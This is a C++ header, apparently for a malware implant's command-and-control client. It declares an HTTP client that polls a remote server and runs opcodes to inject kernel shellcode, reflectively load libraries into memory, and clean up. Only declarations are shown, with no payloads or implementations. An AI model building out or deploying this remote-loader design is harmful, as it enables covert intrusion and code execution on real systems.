#pragma once
#include "pch.h"
#include "ReflectiveLibraryLoader.h"
#include "httplib.h"

constexpr DWORD KeepAliveOpcode = 0;

enum class ServerOpcode {
	InjectKernelShellcode = 1,
	LoadLibraryReflectively,
	Cleanup
};

enum class ClientOpcode {
	Success = 1,
	SuccessWithReturnedData,
	Failure
};

class HttpClient
{
	using CallbackFunctionSig = BOOL(ServerOpcode, const PVOID, SIZE_T, std::string*);

private:
	std::function<BOOL(ServerOpcode, const PVOID, SIZE_T, std::string*)> CallbackFunction;
	
	httplib::Client Client;

public:
	HttpClient(std::string IpAddress, DWORD Port, std::function<CallbackFunctionSig> Callback = nullptr)
		: CallbackFunction(Callback), Client(IpAddress, Port) { }
	
	httplib::Error FetchFromServer();

	~HttpClient() { Client.stop(); }
};